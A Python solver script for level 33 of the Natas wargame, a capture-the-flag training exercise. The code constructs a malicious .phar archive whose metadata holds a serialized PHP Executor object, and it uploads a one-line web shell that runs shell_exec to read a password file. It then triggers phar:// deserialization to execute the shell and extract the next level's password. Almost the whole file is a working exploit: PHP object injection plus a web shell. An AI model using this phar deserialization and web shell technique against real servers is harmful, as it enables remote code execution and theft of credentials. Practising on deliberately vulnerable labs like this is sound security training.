import re
import struct
import time
import zlib
import hashlib          # <- nuevo

from src.natas.base_level import NatasLevel


class Level_33(NatasLevel):

  num = 33
  explanation = "On this level, md5_file() is called on a phar:// stream,\n     which triggers PHP object deserialization.\n     We build a malicious .phar in pure Python whose metadata holds a serialized Executor object pointing to shell.php,\n     upload both, then request phar://natas.phar/test.txt to trigger it."

  def exploit(self) -> str:

    def private_prop(_class, _name):
      return f"\x00{_class}\x00{_name}"

    def php_serialize(value):
      if isinstance(value, bool):
        return f'b:{1 if value else 0};'
      return f's:{len(value.encode())}:"{value}";'

    CLASS = "Executor"
    PROPS = {
        private_prop(CLASS, "filename"): "shell.php",
        private_prop(CLASS, "signature"): True,
        private_prop(CLASS, "init"): False,
    }
    body = "".join(
      f's:{len(k.encode())}:"{k}";{php_serialize(v)}'
      for k, v in PROPS.items()
    )
    metadata = f'O:{len(CLASS)}:"{CLASS}":{len(PROPS)}:{{{body}}}'.encode()

    stub    = b"<?php __HALT_COMPILER(); ?>\r\n"
    name    = b"test.txt"
    content = b"text"
    crc     = zlib.crc32(content) & 0xFFFFFFFF

    file_entry  = struct.pack("<I", len(name)) + name
    file_entry += struct.pack("<I", int(time.time()))
    file_entry += struct.pack("<I", len(content))
    file_entry += struct.pack("<I", crc)
    file_entry += struct.pack("<I", 0)
    file_entry += struct.pack("<I", 0)

    GLOBAL_FLAGS = 0x00010000  # SIG_FLAG: indica que el phar trae firma al final

    manifest  = struct.pack("<I", 1)
    manifest += b"\x11\x00"
    manifest += struct.pack("<I", GLOBAL_FLAGS)   # <- antes era 0
    manifest += struct.pack("<I", 0)
    manifest += struct.pack("<I", len(metadata)) + metadata
    manifest += file_entry

    phar_body = stub + struct.pack("<I", len(manifest)) + manifest + content

    # Bloque de firma: hash del contenido + flag de algoritmo (SHA1=0x0002) + magic "GBMB"
    signature = hashlib.sha1(phar_body).digest()
    phar = phar_body + signature + struct.pack("<I", 0x0002) + b"GBMB"

    shell = b'<?php echo shell_exec("cat /etc/natas_webpass/natas34"); ?>'

    self.session.post(
      self.base_url + "/index.php",
      files={"uploadedfile": ("shell.php", shell, "application/octet-stream")},
      data={"filename": "shell.php"},
    )
    self.session.post(
      self.base_url + "/index.php",
      files={"uploadedfile": ("natas.phar", phar, "application/octet-stream")},
      data={"filename": "natas.phar"},
    )
    resp = self.session.post(
      self.base_url + "/index.php",
      files={"uploadedfile": ("shell.php", shell, "application/octet-stream")},
      data={"filename": "phar://natas.phar/test.txt"},
    )

    match = re.findall(r'[a-zA-Z0-9]{32}', resp.text)
    return match[-1]
